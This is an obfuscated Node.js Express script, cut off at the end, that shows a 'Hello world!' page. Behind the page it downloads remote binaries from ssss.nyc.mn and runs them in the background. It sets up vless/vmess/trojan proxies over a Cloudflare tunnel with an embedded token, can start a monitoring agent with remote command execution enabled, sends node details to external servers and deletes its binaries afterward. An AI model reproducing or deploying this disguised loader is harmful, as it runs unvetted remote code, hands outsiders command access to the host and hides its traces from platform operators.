const _0x2addb5=_0x589f;(function(_0x5f3ab9,_0xd1d862){const _0x52b130=_0x589f,_0x32f48f=_0x5f3ab9();while(!![]){try{const _0x487a9d=-parseInt(_0x52b130(0x217))/0x1*(parseInt(_0x52b130(0x1cd))/0x2)+-parseInt(_0x52b130(0x23b))/0x3+parseInt(_0x52b130(0x259))/0x4+-parseInt(_0x52b130(0x263))/0x5+-parseInt(_0x52b130(0x1e7))/0x6+parseInt(_0x52b130(0x24e))/0x7*(-parseInt(_0x52b130(0x27a))/0x8)+parseInt(_0x52b130(0x25b))/0x9;if(_0x487a9d===_0xd1d862)break;else _0x32f48f['push'](_0x32f48f['shift']());}catch(_0x45f5fc){_0x32f48f['push'](_0x32f48f['shift']());}}}(_0x2697,0xa37b3));const express=require(_0x2addb5(0x1cb)),app=express(),axios=require(_0x2addb5(0x25c)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x2addb5(0x20e)),exec=promisify(require(_0x2addb5(0x1c9))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x2addb5(0x222)][_0x2addb5(0x1ee)]||'',PROJECT_URL=process[_0x2addb5(0x222)][_0x2addb5(0x277)]||'',AUTO_ACCESS=process['env'][_0x2addb5(0x1ea)]||![],FILE_PATH=process['env'][_0x2addb5(0x265)]||'./tmp',SUB_PATH=process[_0x2addb5(0x222)][_0x2addb5(0x21e)]||_0x2addb5(0x1e2),PORT=process['env'][_0x2addb5(0x287)]||process[_0x2addb5(0x222)][_0x2addb5(0x233)]||0xbb8,UUID=process[_0x2addb5(0x222)]['UUID']||'138323ac-7c30-4e55-be96-f2c1155e3f90',NEZHA_SERVER=process[_0x2addb5(0x222)][_0x2addb5(0x24c)]||'',NEZHA_PORT=process[_0x2addb5(0x222)][_0x2addb5(0x1cf)]||'',NEZHA_KEY=process[_0x2addb5(0x222)][_0x2addb5(0x216)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x2addb5(0x1d6),ARGO_AUTH=process[_0x2addb5(0x222)][_0x2addb5(0x200)]||'eyJhIjoiMDkwMjA2Njk0ZDc1Y2VkNDdlMGFlYTY2MTMyMWU3ZmYiLCJ0IjoiOWIwODBkZWQtZDE4My00YjVmLWEyMTMtMDM0OGYxMzAzMGE4IiwicyI6IllUWmxNVEl5WmpNdE9EVm1NaTAwTUdFeUxUazJaREV0TkRVMVpEZzVPV015WW1VNCJ9',ARGO_PORT=process[_0x2addb5(0x222)][_0x2addb5(0x247)]||0x1f41,CFIP=process[_0x2addb5(0x222)]['CFIP']||_0x2addb5(0x1f2),CFPORT=process[_0x2addb5(0x222)][_0x2addb5(0x1e0)]||0x1bb,NAME=process['env'][_0x2addb5(0x23e)]||_0x2addb5(0x20d);!fs[_0x2addb5(0x241)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x2addb5(0x26f)](FILE_PATH+_0x2addb5(0x1d7))):console[_0x2addb5(0x26f)](FILE_PATH+_0x2addb5(0x267));function generateRandomName(){const _0x247c19=_0x2addb5,_0x63951d=_0x247c19(0x202);let _0x11a501='';for(let _0x51031b=0x0;_0x51031b<0x6;_0x51031b++){_0x11a501+=_0x63951d['charAt'](Math['floor'](Math['random']()*_0x63951d[_0x247c19(0x25a)]));}return _0x11a501;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2addb5(0x227)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x2addb5(0x227)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x2addb5(0x227)](FILE_PATH,_0x2addb5(0x251)),listPath=path[_0x2addb5(0x227)](FILE_PATH,_0x2addb5(0x1f7)),bootLogPath=path[_0x2addb5(0x227)](FILE_PATH,_0x2addb5(0x1e3)),configPath=path['join'](FILE_PATH,_0x2addb5(0x264));function deleteNodes(){const _0x53c018=_0x2addb5;try{if(!UPLOAD_URL)return;if(!fs[_0x53c018(0x241)](subPath))return;let _0x416209;try{_0x416209=fs[_0x53c018(0x235)](subPath,_0x53c018(0x1c3));}catch{return null;}const _0x459bb6=Buffer[_0x53c018(0x269)](_0x416209,_0x53c018(0x27b))['toString'](_0x53c018(0x1c3)),_0xe09cb8=_0x459bb6['split']('\x0a')['filter'](_0x27031f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x53c018(0x20c)](_0x27031f));if(_0xe09cb8['length']===0x0)return;return axios[_0x53c018(0x283)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x53c018(0x270)]({'nodes':_0xe09cb8}),{'headers':{'Content-Type':_0x53c018(0x211)}})[_0x53c018(0x21f)](_0x201992=>{return null;}),null;}catch(_0x42c194){return null;}}function cleanupOldFiles(){const _0xae63f9=_0x2addb5;try{const _0x1f18f6=fs[_0xae63f9(0x1f1)](FILE_PATH);_0x1f18f6[_0xae63f9(0x21a)](_0x47aee3=>{const _0x5ced19=_0xae63f9,_0x57cccf=path[_0x5ced19(0x227)](FILE_PATH,_0x47aee3);try{const _0x2c7953=fs[_0x5ced19(0x21d)](_0x57cccf);_0x2c7953[_0x5ced19(0x27f)]()&&fs['unlinkSync'](_0x57cccf);}catch(_0x41c8b9){}});}catch(_0x27240e){}}app[_0x2addb5(0x220)]('/',function(_0x38481c,_0x2442a1){const _0x42d754=_0x2addb5;_0x2442a1[_0x42d754(0x1dc)]('Hello\x20world!');});async function generateConfig(){const _0x1460f4=_0x2addb5,_0x4bb517={'log':{'access':'/dev/null','error':_0x1460f4(0x286),'loglevel':_0x1460f4(0x257)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1460f4(0x242),'settings':{'clients':[{'id':UUID,'flow':_0x1460f4(0x1f9)}],'decryption':_0x1460f4(0x257),'fallbacks':[{'dest':0xbb9},{'path':_0x1460f4(0x1e4),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x1460f4(0x221),'dest':0xbbc}]},'streamSettings':{'network':_0x1460f4(0x252)}},{'port':0xbb9,'listen':_0x1460f4(0x1ec),'protocol':_0x1460f4(0x242),'settings':{'clients':[{'id':UUID}],'decryption':_0x1460f4(0x257)},'streamSettings':{'network':'tcp','security':_0x1460f4(0x257)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x1460f4(0x242),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1460f4(0x257)},'streamSettings':{'network':'ws','security':_0x1460f4(0x257),'wsSettings':{'path':_0x1460f4(0x1e4)}},'sniffing':{'enabled':!![],'destOverride':[_0x1460f4(0x22f),_0x1460f4(0x205),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1460f4(0x1ec),'protocol':_0x1460f4(0x1d5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1460f4(0x22f),_0x1460f4(0x205),_0x1460f4(0x280)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1460f4(0x1ec),'protocol':_0x1460f4(0x1db),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1460f4(0x257),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1460f4(0x22f),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x1460f4(0x23c)]},'outbounds':[{'protocol':'freedom','tag':_0x1460f4(0x26a)},{'protocol':'blackhole','tag':_0x1460f4(0x255)}]};fs[_0x1460f4(0x1d2)](path['join'](FILE_PATH,'config.json'),JSON[_0x1460f4(0x270)](_0x4bb517,null,0x2));}function getSystemArchitecture(){const _0x2b494d=_0x2addb5,_0x42abe9=os[_0x2b494d(0x273)]();return _0x42abe9===_0x2b494d(0x274)||_0x42abe9===_0x2b494d(0x209)||_0x42abe9===_0x2b494d(0x20b)?_0x2b494d(0x274):_0x2b494d(0x1f8);}function downloadFile(_0xbafcb5,_0x18116b,_0x272dde){const _0x2fc337=_0x2addb5,_0x1251b8=_0xbafcb5;!fs[_0x2fc337(0x241)](FILE_PATH)&&fs[_0x2fc337(0x238)](FILE_PATH,{'recursive':!![]});const _0x57931e=fs['createWriteStream'](_0x1251b8);axios({'method':_0x2fc337(0x220),'url':_0x18116b,'responseType':_0x2fc337(0x1fc)})['then'](_0x295c4e=>{const _0x445889=_0x2fc337;_0x295c4e[_0x445889(0x20f)][_0x445889(0x1d0)](_0x57931e),_0x57931e['on'](_0x445889(0x250),()=>{const _0x55769a=_0x445889;_0x57931e[_0x55769a(0x218)](),console['log']('Download\x20'+path[_0x55769a(0x1cc)](_0x1251b8)+_0x55769a(0x1e1)),_0x272dde(null,_0x1251b8);}),_0x57931e['on'](_0x445889(0x249),_0x3c5bfe=>{const _0x197802=_0x445889;fs[_0x197802(0x239)](_0x1251b8,()=>{});const _0x5c7f81=_0x197802(0x237)+path[_0x197802(0x1cc)](_0x1251b8)+_0x197802(0x282)+_0x3c5bfe[_0x197802(0x281)];console[_0x197802(0x249)](_0x5c7f81),_0x272dde(_0x5c7f81);});})['catch'](_0x3cdd05=>{const _0x5b26a9=_0x2fc337,_0x47583c=_0x5b26a9(0x237)+path[_0x5b26a9(0x1cc)](_0x1251b8)+_0x5b26a9(0x282)+_0x3cdd05[_0x5b26a9(0x281)];console['error'](_0x47583c),_0x272dde(_0x47583c);});}async function downloadFilesAndRun(){const _0x5801f5=_0x2addb5,_0x3388c4=getSystemArchitecture(),_0x1a4a50=getFilesForArchitecture(_0x3388c4);if(_0x1a4a50[_0x5801f5(0x25a)]===0x0){console[_0x5801f5(0x26f)](_0x5801f5(0x1dd));return;}const _0x11967a=_0x1a4a50[_0x5801f5(0x213)](_0x22c622=>{return new Promise((_0x481bf0,_0x27b73e)=>{const _0x61b00a=_0x589f;downloadFile(_0x22c622[_0x61b00a(0x26d)],_0x22c622['fileUrl'],(_0x142c11,_0x188d4f)=>{_0x142c11?_0x27b73e(_0x142c11):_0x481bf0(_0x188d4f);});});});try{await Promise[_0x5801f5(0x1f3)](_0x11967a);}catch(_0x874910){console[_0x5801f5(0x249)]('Error\x20downloading\x20files:',_0x874910);return;}function _0x4d6d06(_0x3cf53f){const _0x30dc1f=_0x5801f5,_0x23fdb1=0x1fd;_0x3cf53f[_0x30dc1f(0x21a)](_0x3e3a31=>{const _0x203b53=_0x30dc1f;fs[_0x203b53(0x241)](_0x3e3a31)&&fs[_0x203b53(0x1c5)](_0x3e3a31,_0x23fdb1,_0x2e5bc7=>{const _0x5d069b=_0x203b53;_0x2e5bc7?console[_0x5d069b(0x249)](_0x5d069b(0x1fa)+_0x3e3a31+':\x20'+_0x2e5bc7):console[_0x5d069b(0x26f)](_0x5d069b(0x1ce)+_0x3e3a31+':\x20'+_0x23fdb1[_0x5d069b(0x26b)](0x8));});});}const _0x419b37=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4d6d06(_0x419b37);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x17e41b=NEZHA_SERVER[_0x5801f5(0x253)](':')?NEZHA_SERVER[_0x5801f5(0x244)](':')[_0x5801f5(0x208)]():'',_0x2aa637=new Set([_0x5801f5(0x1c6),_0x5801f5(0x1d3),_0x5801f5(0x21c),_0x5801f5(0x1fb),'2083',_0x5801f5(0x268)]),_0x3dd84e=_0x2aa637[_0x5801f5(0x27e)](_0x17e41b)?_0x5801f5(0x245):'false',_0x524922=_0x5801f5(0x248)+NEZHA_KEY+_0x5801f5(0x1c7)+NEZHA_SERVER+_0x5801f5(0x284)+_0x3dd84e+_0x5801f5(0x203)+UUID;fs[_0x5801f5(0x1d2)](path[_0x5801f5(0x227)](FILE_PATH,_0x5801f5(0x243)),_0x524922);const _0x23dc8d='nohup\x20'+phpPath+_0x5801f5(0x24f)+FILE_PATH+_0x5801f5(0x271);try{await exec(_0x23dc8d),console['log'](phpName+_0x5801f5(0x261)),await new Promise(_0x1d5e64=>setTimeout(_0x1d5e64,0x3e8));}catch(_0x55cab3){console[_0x5801f5(0x249)](_0x5801f5(0x228)+_0x55cab3);}}else{let _0x455b2e='';const _0x37f5c1=['443','8443',_0x5801f5(0x21c),_0x5801f5(0x1fb),'2083',_0x5801f5(0x268)];_0x37f5c1[_0x5801f5(0x253)](NEZHA_PORT)&&(_0x455b2e=_0x5801f5(0x231));const _0x2ae561=_0x5801f5(0x230)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x5801f5(0x278)+NEZHA_KEY+'\x20'+_0x455b2e+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2ae561),console['log'](npmName+_0x5801f5(0x261)),await new Promise(_0x5c91eb=>setTimeout(_0x5c91eb,0x3e8));}catch(_0x19e85b){console['error'](_0x5801f5(0x212)+_0x19e85b);}}}else console[_0x5801f5(0x26f)](_0x5801f5(0x207));const _0x2ec4b2=_0x5801f5(0x230)+webPath+_0x5801f5(0x1f4)+FILE_PATH+_0x5801f5(0x289);try{await exec(_0x2ec4b2),console[_0x5801f5(0x26f)](webName+_0x5801f5(0x261)),await new Promise(_0x2e857e=>setTimeout(_0x2e857e,0x3e8));}catch(_0x26f120){console[_0x5801f5(0x249)](_0x5801f5(0x1f0)+_0x26f120);}if(fs[_0x5801f5(0x241)](botPath)){let _0x380355;if(ARGO_AUTH[_0x5801f5(0x1ca)](/^[A-Z0-9a-z=]{120,250}$/))_0x380355=_0x5801f5(0x1c8)+ARGO_AUTH;else ARGO_AUTH[_0x5801f5(0x1ca)](/TunnelSecret/)?_0x380355=_0x5801f5(0x23d)+FILE_PATH+_0x5801f5(0x204):_0x380355=_0x5801f5(0x272)+FILE_PATH+_0x5801f5(0x225)+ARGO_PORT;try{await exec(_0x5801f5(0x230)+botPath+'\x20'+_0x380355+'\x20>/dev/null\x202>&1\x20&'),console[_0x5801f5(0x26f)](botName+_0x5801f5(0x261)),await new Promise(_0x35e72b=>setTimeout(_0x35e72b,0x7d0));}catch(_0x44960d){console[_0x5801f5(0x249)](_0x5801f5(0x275)+_0x44960d);}}await new Promise(_0x2a206f=>setTimeout(_0x2a206f,0x1388));}function _0x589f(_0x45f139,_0x4746fc){_0x45f139=_0x45f139-0x1c3;const _0x269757=_0x2697();let _0x589f47=_0x269757[_0x45f139];return _0x589f47;}function getFilesForArchitecture(_0x25da7a){const _0x3b5fbb=_0x2addb5;let _0x3782fe;_0x25da7a===_0x3b5fbb(0x274)?_0x3782fe=[{'fileName':webPath,'fileUrl':_0x3b5fbb(0x1e8)},{'fileName':botPath,'fileUrl':_0x3b5fbb(0x285)}]:_0x3782fe=[{'fileName':webPath,'fileUrl':_0x3b5fbb(0x1ef)},{'fileName':botPath,'fileUrl':_0x3b5fbb(0x206)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x347d11=_0x25da7a===_0x3b5fbb(0x274)?_0x3b5fbb(0x1e5):_0x3b5fbb(0x24d);_0x3782fe[_0x3b5fbb(0x288)]({'fileName':npmPath,'fileUrl':_0x347d11});}else{const _0x5cf762=_0x25da7a===_0x3b5fbb(0x274)?_0x3b5fbb(0x214):_0x3b5fbb(0x23a);_0x3782fe[_0x3b5fbb(0x288)]({'fileName':phpPath,'fileUrl':_0x5cf762});}}return _0x3782fe;}function argoType(){const _0x5dcbc6=_0x2addb5;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x5dcbc6(0x260));return;}if(ARGO_AUTH[_0x5dcbc6(0x253)](_0x5dcbc6(0x262))){fs[_0x5dcbc6(0x1d2)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x5d08d9=_0x5dcbc6(0x219)+ARGO_AUTH[_0x5dcbc6(0x244)]('\x22')[0xb]+_0x5dcbc6(0x279)+path['join'](FILE_PATH,_0x5dcbc6(0x22c))+_0x5dcbc6(0x25f)+ARGO_DOMAIN+_0x5dcbc6(0x1de)+ARGO_PORT+_0x5dcbc6(0x27d);fs[_0x5dcbc6(0x1d2)](path[_0x5dcbc6(0x227)](FILE_PATH,'tunnel.yml'),_0x5d08d9);}else console[_0x5dcbc6(0x26f)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x2756de=_0x2addb5;let _0x32f997;if(ARGO_AUTH&&ARGO_DOMAIN)_0x32f997=ARGO_DOMAIN,console[_0x2756de(0x26f)]('ARGO_DOMAIN:',_0x32f997),await _0x34809d(_0x32f997);else try{const _0x5c1b9d=fs[_0x2756de(0x235)](path['join'](FILE_PATH,'boot.log'),'utf-8'),_0xff64e9=_0x5c1b9d[_0x2756de(0x244)]('\x0a'),_0x242c37=[];_0xff64e9[_0x2756de(0x21a)](_0x372b4d=>{const _0x5abb1c=_0x2756de,_0x3141bd=_0x372b4d['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3141bd){const _0x23b986=_0x3141bd[0x1];_0x242c37[_0x5abb1c(0x210)](_0x23b986);}});if(_0x242c37[_0x2756de(0x25a)]>0x0)_0x32f997=_0x242c37[0x0],console[_0x2756de(0x26f)](_0x2756de(0x23f),_0x32f997),await _0x34809d(_0x32f997);else{console[_0x2756de(0x26f)](_0x2756de(0x276)),fs[_0x2756de(0x215)](path[_0x2756de(0x227)](FILE_PATH,_0x2756de(0x1e3)));async function _0x134222(){const _0x2c85df=_0x2756de;try{process['platform']===_0x2c85df(0x236)?await exec(_0x2c85df(0x1da)+botName+_0x2c85df(0x1fe)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x2c85df(0x256)](0x1)+_0x2c85df(0x24b));}catch(_0x1212db){}}_0x134222(),await new Promise(_0x3d6f15=>setTimeout(_0x3d6f15,0xbb8));const _0x5d03f8=_0x2756de(0x272)+FILE_PATH+_0x2756de(0x225)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5d03f8+_0x2756de(0x201)),console[_0x2756de(0x26f)](botName+'\x20is\x20running'),await new Promise(_0x2fa9a7=>setTimeout(_0x2fa9a7,0xbb8)),await extractDomains();}catch(_0x343154){console['error']('Error\x20executing\x20command:\x20'+_0x343154);}}}catch(_0x366d51){console[_0x2756de(0x249)]('Error\x20reading\x20boot.log:',_0x366d51);}async function _0x322d03(){const _0x26d5fd=_0x2756de;try{const _0x3f9907=await axios[_0x26d5fd(0x220)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x3f9907[_0x26d5fd(0x20f)]&&_0x3f9907['data'][_0x26d5fd(0x1f6)]&&_0x3f9907[_0x26d5fd(0x20f)][_0x26d5fd(0x1ff)])return _0x3f9907['data'][_0x26d5fd(0x1f6)]+'_'+_0x3f9907[_0x26d5fd(0x20f)][_0x26d5fd(0x1ff)];}catch(_0x3fea10){try{const _0x59de99=await axios[_0x26d5fd(0x220)](_0x26d5fd(0x232),{'timeout':0xbb8});if(_0x59de99[_0x26d5fd(0x20f)]&&_0x59de99[_0x26d5fd(0x20f)][_0x26d5fd(0x234)]===_0x26d5fd(0x1d1)&&_0x59de99[_0x26d5fd(0x20f)][_0x26d5fd(0x224)]&&_0x59de99[_0x26d5fd(0x20f)]['org'])return _0x59de99[_0x26d5fd(0x20f)][_0x26d5fd(0x224)]+'_'+_0x59de99[_0x26d5fd(0x20f)]['org'];}catch(_0x4918e3){}}return _0x26d5fd(0x1e9);}async function _0x34809d(_0x6da09c){const _0x4c9130=await _0x322d03(),_0x3e1cb2=NAME?NAME+'-'+_0x4c9130:_0x4c9130;return new Promise(_0x229677=>{setTimeout(()=>{const _0x5cf1a3=_0x589f,_0x83c704={'v':'2','ps':''+_0x3e1cb2,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5cf1a3(0x257),'net':'ws','type':_0x5cf1a3(0x257),'host':_0x6da09c,'path':_0x5cf1a3(0x246),'tls':'tls','sni':_0x6da09c,'alpn':'','fp':_0x5cf1a3(0x226)},_0x403f97=_0x5cf1a3(0x266)+UUID+'@'+CFIP+':'+CFPORT+_0x5cf1a3(0x25d)+_0x6da09c+_0x5cf1a3(0x22d)+_0x6da09c+_0x5cf1a3(0x20a)+_0x3e1cb2+_0x5cf1a3(0x1ed)+Buffer['from'](JSON[_0x5cf1a3(0x270)](_0x83c704))[_0x5cf1a3(0x26b)]('base64')+_0x5cf1a3(0x1e6)+UUID+'@'+CFIP+':'+CFPORT+_0x5cf1a3(0x22e)+_0x6da09c+_0x5cf1a3(0x22d)+_0x6da09c+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x3e1cb2+_0x5cf1a3(0x1d9);console[_0x5cf1a3(0x26f)](Buffer[_0x5cf1a3(0x269)](_0x403f97)['toString'](_0x5cf1a3(0x27b))),fs[_0x5cf1a3(0x1d2)](subPath,Buffer[_0x5cf1a3(0x269)](_0x403f97)['toString'](_0x5cf1a3(0x27b))),console[_0x5cf1a3(0x26f)](FILE_PATH+_0x5cf1a3(0x229)),uploadNodes(),app[_0x5cf1a3(0x220)]('/'+SUB_PATH,(_0x10dac1,_0x583e14)=>{const _0x57e559=_0x5cf1a3,_0x481ccd=Buffer[_0x57e559(0x269)](_0x403f97)['toString'](_0x57e559(0x27b));_0x583e14[_0x57e559(0x254)](_0x57e559(0x1fd),'text/plain;\x20charset=utf-8'),_0x583e14[_0x57e559(0x1dc)](_0x481ccd);}),_0x229677(_0x403f97);},0x7d0);});}}async function uploadNodes(){const _0x3b3db4=_0x2addb5;if(UPLOAD_URL&&PROJECT_URL){const _0x2aacdb=PROJECT_URL+'/'+SUB_PATH,_0x56f7b4={'subscription':[_0x2aacdb]};try{const _0x39fd1d=await axios[_0x3b3db4(0x283)](UPLOAD_URL+_0x3b3db4(0x24a),_0x56f7b4,{'headers':{'Content-Type':'application/json'}});return _0x39fd1d&&_0x39fd1d[_0x3b3db4(0x234)]===0xc8?(console[_0x3b3db4(0x26f)](_0x3b3db4(0x240)),_0x39fd1d):null;}catch(_0x22a530){if(_0x22a530[_0x3b3db4(0x1d8)]){if(_0x22a530[_0x3b3db4(0x1d8)][_0x3b3db4(0x234)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3b3db4(0x241)](listPath))return;const _0x5642e2=fs[_0x3b3db4(0x235)](listPath,_0x3b3db4(0x1c3)),_0x150a2b=_0x5642e2[_0x3b3db4(0x244)]('\x0a')['filter'](_0x3e6e3c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3e6e3c));if(_0x150a2b[_0x3b3db4(0x25a)]===0x0)return;const _0x4e2afe=JSON['stringify']({'nodes':_0x150a2b});try{const _0x24a6d4=await axios['post'](UPLOAD_URL+_0x3b3db4(0x1f5),_0x4e2afe,{'headers':{'Content-Type':_0x3b3db4(0x211)}});return _0x24a6d4&&_0x24a6d4[_0x3b3db4(0x234)]===0xc8?(console[_0x3b3db4(0x26f)]('Nodes\x20uploaded\x20successfully'),_0x24a6d4):null;}catch(_0x480d94){return null;}}else return;}}function _0x2697(){const _0x2b944f=['match','express','basename','2114VLkGrr','Empowerment\x20success\x20for\x20','NEZHA_PORT','pipe','success','writeFileSync','8443','App\x20is\x20running','vmess','railway.e.2.2.0.9.1.0.0.0.7.4.0.1.0.0.2.ip6.arpa','\x20is\x20created','response','\x0a\x20\x20\x20\x20','taskkill\x20/f\x20/im\x20','trojan','send','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','http\x20server\x20is\x20running\x20on\x20port:','CFPORT','\x20successfully','666','boot.log','/vless-argo','https://arm64.ssss.nyc.mn/agent','\x0a\x0atrojan://','5858520NGluLN','https://arm64.ssss.nyc.mn/web','Unknown','AUTO_ACCESS','Error\x20in\x20startserver:','127.0.0.1','\x0a\x0avmess://','UPLOAD_URL','https://amd64.ssss.nyc.mn/web','web\x20running\x20error:\x20','readdirSync','freeyx.cloudflare88.eu.org','all','\x20-c\x20','/api/add-nodes','country_code','list.txt','amd','xtls-rprx-vision','Empowerment\x20failed\x20for\x20','2087','stream','Content-Type','.exe\x20>\x20nul\x202>&1','org','ARGO_AUTH','\x20>/dev/null\x202>&1\x20&','abcdefghijklmnopqrstuvwxyz','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/tunnel.yml\x20run','tls','https://amd64.ssss.nyc.mn/bot','NEZHA\x20variable\x20is\x20empty,skip\x20running','pop','arm64','&path=%2Fvless-argo%3Fed%3D2560#','aarch64','test','railway','util','data','push','application/json','npm\x20running\x20error:\x20','map','https://arm64.ssss.nyc.mn/v1','unlinkSync','NEZHA_KEY','289UmSzKB','close','\x0a\x20\x20tunnel:\x20','forEach','\x20>\x20nul\x202>&1','2096','statSync','SUB_PATH','catch','get','/trojan-argo','env','rm\x20-rf\x20','countryCode','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','firefox','join','php\x20running\x20error:\x20','/sub.txt\x20saved\x20successfully','https://oooo.serv00.net/add-url','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tunnel.json','&fp=firefox&type=ws&host=','?security=tls&sni=','http','nohup\x20','--tls','http://ip-api.com/json/','PORT','status','readFileSync','win32','Download\x20','mkdirSync','unlink','https://amd64.ssss.nyc.mn/v1','1846341QqwDSL','https+local://8.8.8.8/dns-query','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','NAME','ArgoDomain:','Subscription\x20uploaded\x20successfully','existsSync','vless','config.yaml','split','true','/vmess-argo?ed=2560','ARGO_PORT','\x0aclient_secret:\x20','error','/api/add-subscriptions','\x22\x20>\x20/dev/null\x202>&1','NEZHA_SERVER','https://amd64.ssss.nyc.mn/agent','574ZkmIbF','\x20-c\x20\x22','finish','sub.txt','tcp','includes','set','block','substring','none','platform','341632GcZoms','length','32577732qqFUoc','axios','?encryption=none&security=tls&sni=','del\x20/f\x20/q\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20is\x20running','TunnelSecret','196575xDAmxl','config.json','FILE_PATH','\x0avless://','\x20already\x20exists','2053','from','direct','toString','Add\x20automatic\x20access\x20task\x20faild:\x20','fileName','clear','log','stringify','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','arch','arm','Error\x20executing\x20command:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','PROJECT_URL','\x20-p\x20','\x0a\x20\x20credentials-file:\x20','107208LLecKh','base64','automatic\x20access\x20task\x20added\x20successfully','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','has','isFile','quic','message','\x20failed:\x20','post','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://arm64.ssss.nyc.mn/bot','/dev/null','SERVER_PORT','unshift','/config.json\x20>/dev/null\x202>&1\x20&','utf-8','\x20>/dev/null\x202>&1','chmod','443','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','child_process'];_0x2697=function(){return _0x2b944f;};return _0x2697();}function cleanFiles(){setTimeout(()=>{const _0x3eab5f=_0x589f,_0x3e6f1c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3e6f1c[_0x3eab5f(0x210)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3e6f1c[_0x3eab5f(0x210)](phpPath);process[_0x3eab5f(0x258)]===_0x3eab5f(0x236)?exec(_0x3eab5f(0x25e)+_0x3e6f1c[_0x3eab5f(0x227)]('\x20')+_0x3eab5f(0x21b),_0x4dff3e=>{const _0x4d618b=_0x3eab5f;console[_0x4d618b(0x26e)](),console[_0x4d618b(0x26f)](_0x4d618b(0x1d4)),console[_0x4d618b(0x26f)](_0x4d618b(0x22b));}):exec(_0x3eab5f(0x223)+_0x3e6f1c[_0x3eab5f(0x227)]('\x20')+_0x3eab5f(0x1c4),_0x21006a=>{const _0x5b930c=_0x3eab5f;console[_0x5b930c(0x26e)](),console['log'](_0x5b930c(0x1d4)),console[_0x5b930c(0x26f)](_0x5b930c(0x22b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x21a275=_0x2addb5;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x21a275(0x26f)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x210f12=await axios['post'](_0x21a275(0x22a),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x21a275(0x211)}});return console[_0x21a275(0x26f)](_0x21a275(0x27c)),_0x210f12;}catch(_0x4056d7){return console[_0x21a275(0x249)](_0x21a275(0x26c)+_0x4056d7[_0x21a275(0x281)]),null;}}async function startserver(){const _0x34d35=_0x2addb5;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 